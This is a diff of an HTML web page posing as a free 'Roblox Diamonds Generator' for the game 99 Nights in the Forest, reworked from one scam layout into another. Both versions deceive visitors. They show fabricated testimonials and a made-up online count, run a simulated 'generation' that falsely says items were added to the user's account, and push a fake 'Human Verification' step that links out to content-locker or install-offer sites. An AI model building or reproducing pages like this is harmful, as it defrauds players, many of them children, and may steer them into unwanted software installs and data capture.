@@ -3,531 +3,415 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>99 Nights in the Forest - Diamonds Generator</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Roblox Diamonds Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
-        
-        body {
-            background: linear-gradient(135deg, #0c1a2d 0%, #152642 100%);
-            color: #fff;
-            min-height: 100vh;
-            padding-bottom: 40px;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        
-        header {
-            padding: 20px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        .fade-in {
+            animation: fadeIn 0.5s ease-out;
         }
-        
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: #4fc3f7;
-            display: flex;
-            align-items: center;
+        .pulse-animation {
+            animation: pulse 2s infinite;
         }
-        
-        .logo i {
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #6C00FF;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
             margin-right: 10px;
         }
-        
-        .hero {
-            text-align: center;
-            padding: 60px 0 40px;
+        .selected-option {
+            border: 2px solid #6C00FF;
+            box-shadow: 0 0 10px rgba(108, 0, 255, 0.5);
         }
-        
-        h1 {
-            font-size: 42px;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, #4fc3f7, #29b6f6);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .subtitle {
-            font-size: 18px;
-            color: #b0bec5;
-            margin-bottom: 20px;
-        }
-        
-        .online-count {
-            display: inline-block;
-            background: rgba(41, 182, 246, 0.2);
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-        
-        .online-count i {
-            color: #4caf50;
-            margin-right: 5px;
-        }
-        
-        .cta-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 40px;
-        }
-        
-        .btn {
-            padding: 12px 30px;
-            border-radius: 6px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-decoration: none;
-            display: inline-block;
-        }
-        
-        .btn-primary {
-            background: #29b6f6;
-            color: white;
-            border: none;
-        }
-        
-        .btn-primary:hover {
-            background: #0288d1;
-            transform: translateY(-2px);
-        }
-        
-        .btn-secondary {
-            background: transparent;
-            color: #29b6f6;
-            border: 1px solid #29b6f6;
-        }
-        
-        .btn-secondary:hover {
-            background: rgba(41, 182, 246, 0.1);
-        }
-        
-        .process-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            margin-bottom: 50px;
-        }
-        
-        .process-step {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            padding: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .step-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .step-number {
-            background: #29b6f6;
+        .step-indicator {
             width: 30px;
             height: 30px;
             border-radius: 50%;
+            background-color: #6C00FF;
+            color: white;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 15px;
             font-weight: bold;
+            margin-right: 10px;
         }
-        
-        .step-title {
-            font-size: 20px;
-            font-weight: 600;
+        .step-indicator.active {
+            background-color: #CFFF04;
+            color: black;
         }
-        
-        .options {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 15px;
-            margin-top: 15px;
+        .progress-bar {
+            height: 6px;
+            background-color: #374151;
+            border-radius: 3px;
+            overflow: hidden;
         }
-        
-        .option {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 6px;
-            padding: 15px;
-            text-align: center;
-            cursor: pointer;
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #6C00FF, #CFFF04);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        .option-card {
             transition: all 0.3s ease;
+            cursor: pointer;
         }
-        
-        .option:hover {
-            background: rgba(41, 182, 246, 0.1);
-            border-color: #29b6f6;
+        .option-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
         }
-        
-        .option.selected {
-            background: rgba(41, 182, 246, 0.2);
-            border-color: #29b6f6;
-            box-shadow: 0 0 10px rgba(41, 182, 246, 0.3);
-        }
-        
-        .option.recommended::after {
-            content: "Recommended";
-            display: block;
-            font-size: 10px;
-            color: #4caf50;
-            margin-top: 5px;
-        }
-        
-        .continue-btn {
-            text-align: center;
-            margin: 30px 0 50px;
-        }
-        
-        .continue-btn .btn {
-            padding: 15px 50px;
-            font-size: 18px;
-        }
-        
-        .testimonials {
-            margin-bottom: 50px;
-        }
-        
-        .section-title {
-            font-size: 28px;
-            text-align: center;
-            margin-bottom: 30px;
-            position: relative;
-        }
-        
-        .section-title::after {
-            content: "";
-            display: block;
-            width: 60px;
-            height: 3px;
-            background: #29b6f6;
-            margin: 10px auto;
-        }
-        
-        .testimonial-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-        }
-        
-        .testimonial {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            padding: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .testimonial-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #29b6f6;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
+        .verification-badge {
+            background: linear-gradient(90deg, #6C00FF, #CFFF04);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             font-weight: bold;
-        }
-        
-        .user-info h4 {
-            font-size: 16px;
-            margin-bottom: 5px;
-        }
-        
-        .user-info span {
-            font-size: 12px;
-            color: #b0bec5;
-        }
-        
-        .stars {
-            color: #ffc107;
-            margin-bottom: 10px;
-        }
-        
-        .how-it-works {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            padding: 30px;
-            margin-bottom: 40px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .steps {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 30px;
-            margin-top: 30px;
-        }
-        
-        .step {
-            text-align: center;
-            padding: 20px;
-        }
-        
-        .step-icon {
-            font-size: 40px;
-            color: #29b6f6;
-            margin-bottom: 15px;
-        }
-        
-        .step h3 {
-            font-size: 18px;
-            margin-bottom: 10px;
-        }
-        
-        footer {
-            text-align: center;
-            padding: 20px 0;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 14px;
-            color: #b0bec5;
-        }
-        
-        .disclaimer {
-            max-width: 800px;
-            margin: 0 auto;
-            line-height: 1.6;
-        }
-        
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 32px;
-            }
-            
-            .cta-buttons {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            .btn {
-                width: 100%;
-                max-width: 300px;
-                text-align: center;
-            }
         }
     </style>
 </head>
-<body>
-    <div class="container">
-        <header>
-            <div class="logo">
-                <i class="fas fa-crown"></i> 99 Nights in the Forest
-            </div>
-        </header>
-        
-        <section class="hero">
-            <h1>99 Nights in the Forest – Diamonds</h1>
-            <p class="subtitle">Instantly generate thousands of diamonds with our smooth, game-like animation. Watch as your chosen amount is processed and added before your eyes.</p>
-            
-            <div class="online-count">
-                <i class="fas fa-circle"></i> 2,514 online now
-            </div>
-            
-            <div class="cta-buttons">
-                <a href="https://pagelocked.org/cl/i/37ek2m" class="btn btn-primary">Start Now</a>
-                <a href="#how-it-works" class="btn btn-secondary">How it works</a>
-            </div>
-        </section>
-        
-        <section class="process-container">
-            <div class="process-step">
-                <div class="step-header">
-                    <div class="step-number">1</div>
-                    <div class="step-title">Select Your Diamonds</div>
+<body class="bg-gray-900 text-gray-100 font-sans min-h-screen" style="font-family: 'Poppins', sans-serif;">
+    <div class="container mx-auto px-4 py-8 max-w-2xl">
+        <!-- Progress Bar -->
+        <div class="mb-8">
+            <div class="flex justify-between items-center mb-2">
+                <div class="flex items-center">
+                    <div class="step-indicator active">1</div>
+                    <span>Selection</span>
                 </div>
-                <p>Choose one amount</p>
-                <div class="options">
-                    <div class="option recommended" data-value="2500">
-                        <h3>2,500 Diamonds</h3>
-                    </div>
-                    <div class="option" data-value="5000">
-                        <h3>5,000 Diamonds</h3>
-                    </div>
-                    <div class="option" data-value="10000">
-                        <h3>10,000 Diamonds</h3>
-                    </div>
+                <div class="flex items-center">
+                    <div class="step-indicator">2</div>
+                    <span>Verification</span>
+                </div>
+                <div class="flex items-center">
+                    <div class="step-indicator">3</div>
+                    <span>Complete</span>
                 </div>
             </div>
-            
-            <div class="process-step">
-                <div class="step-header">
-                    <div class="step-number">2</div>
-                    <div class="step-title">Select Your Desired Class</div>
-                </div>
-                <p>Choose one class</p>
-                <div class="options">
-                    <div class="option" data-value="assassin">
-                        <h3>Assassin</h3>
-                    </div>
-                    <div class="option" data-value="cyporg">
-                        <h3>Cyporg</h3>
-                    </div>
-                    <div class="option" data-value="pyromaniac">
-                        <h3>Pyromaniac</h3>
-                    </div>
-                </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill" style="width: 0%"></div>
             </div>
-            
-            <div class="process-step">
-                <div class="step-header">
-                    <div class="step-number">3</div>
-                    <div class="step-title">Select Your Desired Item</div>
-                </div>
-                <p>Choose one item</p>
-                <div class="options">
-                    <div class="option" data-value="ice-sword">
-                        <h3>Ice Sword</h3>
-                    </div>
-                    <div class="option" data-value="tedent">
-                        <h3>TEDENT</h3>
-                    </div>
-                    <div class="option" data-value="trident">
-                        <h3>Trident</h3>
-                    </div>
-                    <div class="option" data-value="mace">
-                        <h3>Cultist King Mace</h3>
-                    </div>
-                </div>
-            </div>
-        </section>
-        
-        <div class="continue-btn">
-            <a href="https://pagelocked.org/cl/i/37ek2m" class="btn btn-primary">Continue →</a>
         </div>
-        
-        <section class="testimonials">
-            <h2 class="section-title">What Our Users Say</h2>
-            <div class="testimonial-grid">
-                <div class="testimonial">
-                    <div class="testimonial-header">
-                        <div class="avatar">JD</div>
-                        <div class="user-info">
-                            <h4>John_Doe92</h4>
-                            <span>Verified User</span>
-                        </div>
-                    </div>
-                    <div class="stars">
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                    </div>
-                    <p>"I was skeptical at first, but this actually worked! Got my 5,000 diamonds in less than 5 minutes. The process was smooth and easy."</p>
-                </div>
+
+        <!-- Step 1: Selection -->
+        <div id="step1" class="fade-in">
+            <h1 class="text-3xl font-bold text-center mb-2">Roblox Diamonds & Items Generator</h1>
+            <p class="text-center text-gray-400 mb-8">Select your diamonds, class, and item to generate</p>
+
+            <!-- Diamonds Selection -->
+            <div class="bg-gray-800 rounded-xl p-6 mb-6">
+                <h2 class="text-xl font-bold mb-4 flex items-center">
+                    <span class="step-indicator active">1</span>
+                    Select Your Diamonds
+                </h2>
+                <p class="text-gray-400 mb-4">Choose one amount</p>
                 
-                <div class="testimonial">
-                    <div class="testimonial-header">
-                        <div class="avatar">SG</div>
-                        <div class="user-info">
-                            <h4>ShadowGamer</h4>
-                            <span>Level 45 Assassin</span>
-                        </div>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center" data-value="2500">
+                        <div class="font-bold text-lg">2,500 Diamonds</div>
+                        <div class="text-xs text-green-400 mt-1">Standard</div>
                     </div>
-                    <div class="stars">
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star-half-alt"></i>
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center" data-value="5000">
+                        <div class="font-bold text-lg">5,000 Diamonds</div>
+                        <div class="text-xs text-green-400 mt-1">Popular</div>
                     </div>
-                    <p>"The Ice Sword I got through this generator is amazing! It made my gameplay so much better. Highly recommend trying this out."</p>
-                </div>
-                
-                <div class="testimonial">
-                    <div class="testimonial-header">
-                        <div class="avatar">EP</div>
-                        <div class="user-info">
-                            <h4>ElitePlayer</h4>
-                            <span>Pyromaniac Main</span>
-                        </div>
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center selected-option" data-value="10000">
+                        <div class="font-bold text-lg">10,000 Diamonds</div>
+                        <div class="text-xs text-green-400 mt-1">Recommended</div>
                     </div>
-                    <div class="stars">
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                    </div>
-                    <p>"I've tried other generators before, but this one is by far the best. No surveys, no downloads, just quick diamonds. 10/10!"</p>
                 </div>
             </div>
-        </section>
-        
-        <section class="how-it-works" id="how-it-works">
-            <h2 class="section-title">How It Works</h2>
-            <div class="steps">
-                <div class="step">
-                    <div class="step-icon">
-                        <i class="fas fa-mouse-pointer"></i>
-                    </div>
-                    <h3>1. Pick an Amount</h3>
-                    <p>Select how many diamonds you want to generate from the available options.</p>
-                </div>
+
+            <!-- Class Selection -->
+            <div class="bg-gray-800 rounded-xl p-6 mb-6">
+                <h2 class="text-xl font-bold mb-4 flex items-center">
+                    <span class="step-indicator active">2</span>
+                    Select Your Desired Class
+                </h2>
+                <p class="text-gray-400 mb-4">Choose one class</p>
                 
-                <div class="step">
-                    <div class="step-icon">
-                        <i class="fas fa-user"></i>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center" data-value="assassin">
+                        <img src="https://i.postimg.cc/fTK26j9B/assassin.png" alt="Assassin" class="w-full h-32 object-contain mb-2">
+                        <div class="font-bold">Assassin</div>
                     </div>
-                    <h3>2. Enter Username</h3>
-                    <p>Enter your username and click Start Generation to begin the process.</p>
-                </div>
-                
-                <div class="step">
-                    <div class="step-icon">
-                        <i class="fas fa-shield-alt"></i>
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center selected-option" data-value="cyborg">
+                        <img src="https://i.postimg.cc/wBWCDjjy/cyborg.png" alt="Cyborg" class="w-full h-32 object-contain mb-2">
+                        <div class="font-bold">Cyborg</div>
                     </div>
-                    <h3>3. Verification</h3>
-                    <p>Complete a quick verification and watch the magic happen as diamonds are added to your account.</p>
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center" data-value="pyromaniac">
+                        <img src="https://i.postimg.cc/mk9Kx3NC/pyromaniac.png" alt="Pyromaniac" class="w-full h-32 object-contain mb-2">
+                        <div class="font-bold">Pyromaniac</div>
+                    </div>
                 </div>
             </div>
-        </section>
-        
-        <footer>
-            <div class="disclaimer">
-                <p>Fan-made interface for entertainment & content creation • © 2025 • Not affiliated with Roblox or 99 Nights in the Forest.</p>
+
+            <!-- Item Selection -->
+            <div class="bg-gray-800 rounded-xl p-6 mb-6">
+                <h2 class="text-xl font-bold mb-4 flex items-center">
+                    <span class="step-indicator active">3</span>
+                    Select Your Desired Item
+                </h2>
+                <p class="text-gray-400 mb-4">Choose one item</p>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center" data-value="ice-sword">
+                        <img src="https://i.postimg.cc/YqcJ6VM3/ice-sword.png" alt="Ice Sword" class="w-full h-32 object-contain mb-2">
+                        <div class="font-bold">Ice Sword</div>
+                        <div class="text-xs text-purple-400 mt-1">Legend</div>
+                    </div>
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center selected-option" data-value="trident">
+                        <img src="https://i.postimg.cc/15pbJHzZ/trident.png" alt="Trident" class="w-full h-32 object-contain mb-2">
+                        <div class="font-bold">Trident</div>
+                        <div class="text-xs text-purple-400 mt-1">Legend</div>
+                    </div>
+                    <div class="option-card bg-gray-700 rounded-lg p-4 text-center" data-value="cultist-king-mace">
+                        <img src="https://i.postimg.cc/7Z9dyZ7s/cultist-king-mace.png" alt="Cultist King Mace" class="w-full h-32 object-contain mb-2">
+                        <div class="font-bold">Cultist King Mace</div>
+                        <div class="text-xs text-purple-400 mt-1">Legend</div>
+                    </div>
+                </div>
             </div>
-        </footer>
+
+            <!-- Selection Summary -->
+            <div class="bg-gray-800 rounded-xl p-6 mb-6">
+                <h2 class="text-xl font-bold mb-4">Selection Summary</h2>
+                <div class="bg-gray-900 rounded-lg p-4">
+                    <p class="text-lg"><span class="verification-badge">Selected:</span> <span id="selectedDiamonds">10,000 Diamonds</span> • <span id="selectedClass">Cyborg</span> • <span id="selectedItem">Trident</span></p>
+                </div>
+            </div>
+
+            <!-- Continue Button -->
+            <button id="continueStep1" class="w-full bg-gradient-to-r from-purple-600 to-green-400 text-black font-bold py-3 px-4 rounded-lg pulse-animation">
+                Continue →
+            </button>
+
+            <p class="text-center text-gray-500 text-xs mt-4">1) Pick an amount - Select an option for how many diamonds you want to generate.</p>
+        </div>
+
+        <!-- Step 2: Username Input -->
+        <div id="step2" class="hidden fade-in">
+            <h1 class="text-3xl font-bold text-center mb-2">Enter Your Username</h1>
+            <p class="text-center text-gray-400 mb-8">Please enter your Roblox username to begin the generation.</p>
+
+            <div class="bg-gray-800 rounded-xl p-6 mb-6">
+                <div class="mb-6">
+                    <label for="username" class="block text-sm font-medium mb-2">Roblox Username</label>
+                    <input type="text" id="username" 
+                           class="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500" 
+                           placeholder="Enter your username">
+                </div>
+                
+                <div class="flex space-x-4">
+                    <button id="cancelStep2" class="w-1/2 bg-gray-700 text-white font-bold py-3 px-4 rounded-lg">
+                        Cancel
+                    </button>
+                    <button id="startGeneration" class="w-1/2 bg-gradient-to-r from-purple-600 to-green-400 text-black font-bold py-3 px-4 rounded-lg">
+                        Start Generation
+                    </button>
+                </div>
+            </div>
+
+            <p class="text-center text-gray-500 text-xs mt-4">Privacy note: the name you type stays on this page only.</p>
+        </div>
+
+        <!-- Step 3: Generating -->
+        <div id="step3" class="hidden fade-in">
+            <h1 class="text-3xl font-bold text-center mb-2">Generating Your Diamonds, Class & Item</h1>
+
+            <div class="bg-gray-800 rounded-xl p-6 mb-6">
+                <ul class="space-y-4">
+                    <li class="flex items-center">
+                        <span class="loading-spinner"></span>
+                        <span>Selected amount: <span id="genDiamonds">10,000</span> Diamonds</span>
+                    </li>
+                    <li class="flex items-center">
+                        <span class="loading-spinner"></span>
+                        <span>Selected class: <span id="genClass">Cyborg</span></span>
+                    </li>
+                    <li class="flex items-center">
+                        <span class="loading-spinner"></span>
+                        <span>Selected item: <span id="genItem">Trident</span></span>
+                    </li>
+                    <li class="flex items-center">
+                        <span class="loading-spinner"></span>
+                        <span>Contacting servers...</span>
+                    </li>
+                    <li class="flex items-center">
+                        <span class="loading-spinner"></span>
+                        <span>Checking account name: <span id="genUsername"></span></span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Step 4: Success -->
+        <div id="step4" class="hidden fade-in">
+            <h1 class="text-3xl font-bold text-center mb-2">Success!</h1>
+            <p class="text-center text-gray-400 mb-8">Your diamonds, selected class and item have been prepared and are ready!</p>
+
+            <div class="bg-gray-800 rounded-xl p-6 mb-6 text-center">
+                <div class="text-2xl font-bold mb-4">
+                    <span id="successDiamonds">10,000</span> Diamonds • Class: <span id="successClass">Cyborg</span> • Item: <span id="successItem">Trident</span>
+                </div>
+                <p class="text-green-400 mb-4">✓ All items have been successfully generated and added to your account!</p>
+            </div>
+
+            <button id="continueVerification" class="w-full bg-gradient-to-r from-purple-600 to-green-400 text-black font-bold py-3 px-4 rounded-lg pulse-animation">
+                Continue → Verification
+            </button>
+        </div>
+
+        <!-- Step 5: Human Verification -->
+        <div id="step5" class="hidden fade-in">
+            <h1 class="text-3xl font-bold text-center mb-2">Human Verification</h1>
+            <p class="text-center text-gray-400 mb-8">To prevent bot abuse, please complete the final step to view your items.</p>
+
+            <div class="bg-gray-800 rounded-xl p-6 mb-6 text-center">
+                <p class="mb-4">Complete one quick verification to access your generated items.</p>
+                <a href="https://installchecker.com/cl/i/1o468e" class="inline-block w-full bg-gradient-to-r from-purple-600 to-green-400 text-black font-bold py-3 px-4 rounded-lg pulse-animation text-center">
+                    Verify Now
+                </a>
+            </div>
+
+            <p class="text-center text-gray-500 text-xs mt-4">This verification ensures that real users are receiving rewards and prevents automated abuse.</p>
+        </div>
     </div>
 
     <script>
-        // Option selection functionality
-        document.querySelectorAll('.option').forEach(option => {
-            option.addEventListener('click', function() {
-                // Remove selected class from siblings
-                const siblings = this.parentElement.children;
-                for (let sibling of siblings) {
-                    sibling.classList.remove('selected');
-                }
+        // Current step tracking
+        let currentStep = 1;
+        const totalSteps = 5;
+        
+        // Selected options
+        let selectedDiamonds = "10000";
+        let selectedClass = "cyborg";
+        let selectedItem = "trident";
+        
+        // DOM elements
+        const stepElements = [
+            document.getElementById('step1'),
+            document.getElementById('step2'),
+            document.getElementById('step3'),
+            document.getElementById('step4'),
+            document.getElementById('step5')
+        ];
+        
+        const progressFill = document.getElementById('progressFill');
+        
+        // Option selection
+        document.querySelectorAll('.option-card').forEach(card => {
+            card.addEventListener('click', function() {
+                // Remove selected class from all cards in the same section
+                const parentSection = this.closest('.bg-gray-800');
+                parentSection.querySelectorAll('.option-card').forEach(c => {
+                    c.classList.remove('selected-option');
+                });
                 
-                // Add selected class to clicked option
-                this.classList.add('selected');
+                // Add selected class to clicked card
+                this.classList.add('selected-option');
+                
+                // Update selection based on section
+                if (parentSection.querySelector('h2').textContent.includes('Diamonds')) {
+                    selectedDiamonds = this.getAttribute('data-value');
+                    document.getElementById('selectedDiamonds').textContent = `${selectedDiamonds} Diamonds`;
+                } else if (parentSection.querySelector('h2').textContent.includes('Class')) {
+                    selectedClass = this.getAttribute('data-value');
+                    document.getElementById('selectedClass').textContent = this.querySelector('.font-bold').textContent;
+                } else if (parentSection.querySelector('h2').textContent.includes('Item')) {
+                    selectedItem = this.getAttribute('data-value');
+                    document.getElementById('selectedItem').textContent = this.querySelector('.font-bold').textContent;
+                }
             });
         });
         
-        // Set default selections
-        document.querySelector('.process-step:nth-child(1) .option').classList.add('selected');
-        document.querySelector('.process-step:nth-child(2) .option').classList.add('selected');
-        document.querySelector('.process-step:nth-child(3) .option').classList.add('selected');
+        // Step navigation
+        document.getElementById('continueStep1').addEventListener('click', function() {
+            navigateToStep(2);
+        });
+        
+        document.getElementById('cancelStep2').addEventListener('click', function() {
+            navigateToStep(1);
+        });
+        
+        document.getElementById('startGeneration').addEventListener('click', function() {
+            const username = document.getElementById('username').value.trim();
+            if (username === '') {
+                alert('Please enter your Roblox username');
+                return;
+            }
+            
+            document.getElementById('genUsername').textContent = username;
+            navigateToStep(3);
+            
+            // Simulate generation process
+            setTimeout(() => {
+                navigateToStep(4);
+            }, 3000);
+        });
+        
+        document.getElementById('continueVerification').addEventListener('click', function() {
+            navigateToStep(5);
+        });
+        
+        // Function to navigate between steps
+        function navigateToStep(step) {
+            // Hide all steps
+            stepElements.forEach(element => {
+                element.classList.add('hidden');
+            });
+            
+            // Show current step
+            stepElements[step-1].classList.remove('hidden');
+            
+            // Update progress bar
+            const progressPercentage = ((step-1) / (totalSteps-1)) * 100;
+            progressFill.style.width = `${progressPercentage}%`;
+            
+            // Update step indicators
+            document.querySelectorAll('.step-indicator').forEach((indicator, index) => {
+                if (index < step) {
+                    indicator.classList.add('active');
+                } else {
+                    indicator.classList.remove('active');
+                }
+            });
+            
+            // Update displayed values in later steps
+            if (step >= 3) {
+                document.getElementById('genDiamonds').textContent = selectedDiamonds;
+                document.getElementById('genClass').textContent = document.querySelector(`.option-card[data-value="${selectedClass}"] .font-bold`).textContent;
+                document.getElementById('genItem').textContent = document.querySelector(`.option-card[data-value="${selectedItem}"] .font-bold`).textContent;
+                
+                document.getElementById('successDiamonds').textContent = selectedDiamonds;
+                document.getElementById('successClass').textContent = document.querySelector(`.option-card[data-value="${selectedClass}"] .font-bold`).textContent;
+                document.getElementById('successItem').textContent = document.querySelector(`.option-card[data-value="${selectedItem}"] .font-bold`).textContent;
+            }
+            
+            currentStep = step;
+        }
+        
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set initial values
+            document.getElementById('selectedDiamonds').textContent = '10,000 Diamonds';
+            document.getElementById('selectedClass').textContent = 'Cyborg';
+            document.getElementById('selectedItem').textContent = 'Trident';
+        });
     </script>
 </body>
 </html>
